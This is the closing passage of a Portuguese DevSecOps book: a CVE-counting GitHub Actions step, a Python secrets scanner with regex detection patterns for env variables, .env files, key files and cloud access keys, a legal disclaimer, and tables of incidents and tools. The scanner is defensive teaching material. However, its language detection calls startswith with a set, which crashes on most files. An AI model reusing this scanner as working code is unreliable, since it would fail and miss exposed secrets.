          HIGH=$(jq '.Results[].Vulnerabilities[] | select(.Severity=="HIGH") | .VulnerabilityID' cve-report.json 2>/dev/null | wc -l)
          echo "CRITICAL: $CRITICAL" >> report.md
          echo "HIGH: $HIGH" >> report.md

      - name: Criar issue se houver CVEs críticas
        if: ${{ env.CRITICAL > 0 }}
        uses: actions/github-script@v7
        with:
          script: |
            const fs = require('fs');
            const report = fs.readFileSync('report.md', 'utf8');
            await github.rest.issues.create({
              owner: context.repo.owner,
              repo: context.repo.repo,
              title: `CVE Monitor: ${process.env.CRITICAL} vulnerabilidades CRÍTICAS detectadas`,
              body: report,
              labels: ['security', 'critical']
            });
```

### 7.4 Comunidade e Contribuições

Este livro é um projeto aberto. Contributions são bem-vindas:

- **Erros e sugestões**: abra uma issue no repositório do projeto
- **Exemplos de código**: contribua com exemplos adicionais ou correções
- **Novos casos públicos**: documente incidentes recentes que não estão cobertos
- **Atualizações de ferramentas**: reporte quando versões mudam ou ferramentas são descontinuadas

### 7.5 Adaptação a Novas Linguagens e Plataformas

Os exemplos neste livro cobrem Bash, Python, YAML, Dockerfile e Go. As práticas de DevSecOps se aplicam a qualquer linguagem, mas a implementação específica varia. Para adaptar os exemplos a outras linguagens:

- **JavaScript/TypeScript**: use ESLint com plugins de segurança (eslint-plugin-security), npm audit, Socket.dev
- **Java**: use SpotBugs com Find Security Bugs, OWASP Dependency-Check, Maven/Gradle plugins
- **Rust**: use cargo-audit, cargo-deny, rustsec
- **Ruby**: use Brakeman (Rails), bundler-audit, RuboCop com plugins de segurança

```python
# Exemplo: adaptandoDetecção de Secrets para múltiplas linguagens
# Este trecho mostra como estender o detector para diferentes tipos de arquivo

import os
from pathlib import Path
from typing import Dict, List, Set

# Mapeamento de extensões para padrões de linguagem
LANGUAGE_EXTENSIONS = {
    'python': {'.py', '.pyx', '.pyi'},
    'javascript': {'.js', '.jsx', '.mjs', '.cjs'},
    'typescript': {'.ts', '.tsx'},
    'java': {'.java'},
    'go': {'.go'},
    'rust': {'.rs'},
    'ruby': {'.rb', '.erb'},
    'php': {'.php'},
    'shell': {'.sh', '.bash', '.zsh'},
    'yaml': {'.yml', '.yaml'},
    'json': {'.json'},
    'dockerfile': {'Dockerfile', 'Dockerfile.*'},
    'terraform': {'.tf', '.tfvars'},
    'kubernetes': {'.yaml', '.yml'},  # Será refinado por conteúdo
}

# Padrões específicos por linguagem
LANGUAGE_SPECIFIC_PATTERNS = {
    'python': [
        r'(?i)(os\.environ|os\.getenv)\s*\(\s*["\']([A-Z_]{8,})["\']',
        r'(?i)open\s*\(\s*["\']\.env["\']',
    ],
    'javascript': [
        r'(?i)process\.env\.[A-Z_]{8,}',
        r'(?i)require\s*\(\s*["\'][\'"]dotenv["\']',
    ],
    'go': [
        r'(?i)os\.Getenv\s*\(\s*["\']([A-Z_]{8,})["\']',
        r'(?i)os\.Setenv\s*\(\s*["\']([A-Z_]{8,})["\']',
    ],
    'dockerfile': [
        r'(?i)^(ENV|ARG)\s+[A-Z_]{8,}=',
        r'(?i)COPY\s+.*\.(pem|key|crt|env)',
    ],
    'terraform': [
        r'(?i)variable\s+"(?:secret|password|token|key)"',
        r'(?i)(access_key|secret_key)\s*=',
    ],
}


def detect_language(file_path: Path) -> str:
    """Detecta a linguagem de um arquivo."""
    suffix = file_path.suffix.lower()
    name = file_path.name.lower()

    for lang, extensions in LANGUAGE_EXTENSIONS.items():
        if suffix in extensions:
            return lang
        if name.startswith(extensions) or any(
            name == ext.lstrip('.') for ext in extensions
        ):
            return lang

    return 'unknown'


def scan_project(project_dir: Path) -> Dict[str, List[dict]]:
    """
    Escaneia um projeto inteiro, detectando linguagens
    e aplicando padrões específicos.
    """
    results = {}

    for file_path in project_dir.rglob('*'):
        if file_path.is_dir():
            continue
        if any(skip in file_path.parts for skip in
               ['.git', 'node_modules', '__pycache__', 'vendor', '.venv']):
            continue

        lang = detect_language(file_path)
        if lang == 'unknown':
            continue

        try:
            content = file_path.read_text(encoding='utf-8', errors='ignore')
        except OSError:
            continue

        findings = []
        for pattern in LANGUAGE_SPECIFIC_PATTERNS.get(lang, []):
            import re
            for match in re.finditer(pattern, content):
                findings.append({
                    'file': str(file_path),
                    'language': lang,
                    'line': content[:match.start()].count('\n') + 1,
                    'pattern': pattern,
                    'match': match.group(0)[:50] + '...' if len(match.group(0)) > 50 else match.group(0),
                })

        if findings:
            results[str(file_path)] = findings

    return results


def print_report(results: Dict[str, List[dict]]):
    """Imprime relatório formatado."""
    print('=' * 60)
    print('RELATÓRIO DE ANÁLISE POR LINGUAGEM')
    print('=' * 60)

    # Agrupar por linguagem
    by_language = {}
    for file_path, findings in results.items():
        for finding in findings:
            lang = finding['language']
            if lang not in by_language:
                by_language[lang] = []
            by_language[lang].append(finding)

    for lang, findings in sorted(by_language.items()):
        print(f'\n[{lang.upper()}] {len(findings)} achado(s)')
        print('-' * 40)
        for f in findings[:10]:  # Limitar a 10 por linguagem
            print(f'  {f["file"]}:{f["line"]} — {f["match"][:60]}')

    print(f'\nTotal: {sum(len(f) for f in results.values())} achados em {len(results)} arquivos')


if __name__ == '__main__':
    import sys
    if len(sys.argv) < 2:
        print('Uso: python lang_detector.py <diretório>')
        sys.exit(1)

    project_dir = Path(sys.argv[1])
    results = scan_project(project_dir)
    print_report(results)
```

---

## Notas Finais

Este livro não pretende ser definitivo. O campo de DevSecOps evolui constantemente, e novas ameaças surgem diariamente. O que pretendemos oferecer é uma base sólida de conhecimento prático, fundamentado em casos reais e ferramentas testadas, que sirva de ponto de partida para sua jornada de segurança em DevOps.

A segurança não é um destino — é uma jornada. E essa jornada começa com a decisão de incorporar segurança ao seu trabalho diário, em cada commit, em cada pipeline, em cada deploy.

Bom estudo.

---

> **Nota sobre versões**: Este documento é a versão 1.0. As ferramentas e versões documentadas refletem o estado da arte no momento da publicação. Verifique sempre as versões mais recentes das ferramentas e as CVEs mais recentes ao longo dos capítulos.

> **Aviso legal**: Os exemplos de código vulnerável neste livro são para fins educacionais apenas. Não use essas técnicas em sistemas que não são de sua propriedade ou para os quais você não tenha autorização explícita. A prática de segurança ofensiva não autorizada é ilegal na maioria das jurisdições.

---

## Sumário dos Casos Públicos Documentados

| # | Caso | Ano | Tipo | Capítulo(s) |
|---|------|-----|------|-------------|
| 1 | SolarWinds Orion | 2020 | Supply Chain | 1, 15 |
| 2 | Codecov Bash Uploader | 2021 | Supply Chain / CI/CD | 1, 4 |
| 3 | 3CX Supply Chain | 2023 | Supply Chain | 1, 15 |
| 4 | xz-utils Backdoor (CVE-2024-3094) | 2024 | Supply Chain / Library | 1, 3 |
| 5 | Log4Shell (CVE-2021-44228) | 2021 | Library Vulnerability | 1, 3, 13 |
| 6 | Capital One | 2019 | Cloud Misconfiguration | 1, 11 |
| 7 | Travis CI Secrets Leak | 2021 | Secrets / CI/CD | 1, 4 |
| 8 | GitHub Actions Supply Chain | 2021 | Supply Chain / CI/CD | 1, 15 |
| 9 | Docker Hub Malicious Images | 2020 | Container Supply Chain | 1, 5 |

## Resumo das Ferramentas Cobertas

| Ferramenta | Categoria | Capítulo de Uso Principal |
|-----------|-----------|---------------------------|
| Semgrep | SAST | 2 |
| Bandit | SAST (Python) | 2 |
| SonarQube | SAST / Qualidade | 2 |
| Trivy | Container / SCA / IaC | 3, 5 |
| Snyk | SCA | 3 |
| OWASP Dependency-Check | SCA | 3 |
| pip-audit | SCA (Python) | 3 |
| Gitleaks | Detecção de Secrets | 4 |
| TruffleHog | Detecção de Secrets | 4 |
| detect-secrets | Detecção de Secrets | 4 |
| HashiCorp Vault | Gestão de Secrets | 4 |
| Docker | Containers | 5 |
| Kubernetes | Orquestração | 6 |
| Kyverno | Policy Engine | 6, 12 |
| OPA/Rego | Policy Engine | 12 |
| Falco | Runtime Security | 8 |
| Terraform | IaC | 9 |
| tfsec | Análise de Terraform | 9 |
| Checkov | Análise de IaC | 9, 10 |
| Ansible | Configuration Management | 10 |
| OWASP ZAP | DAST | 14 |
| Nuclei | DAST / Vulnerability Scanning | 14 |
| Nmap | Análise de Rede | 14 |
| Grafana | Monitoramento | 8 |
| Prometheus | Métricas | 8 |

---

*DevSecOps na Prática — Primeira Edição*
*© 2024 — Todos os direitos reservados*
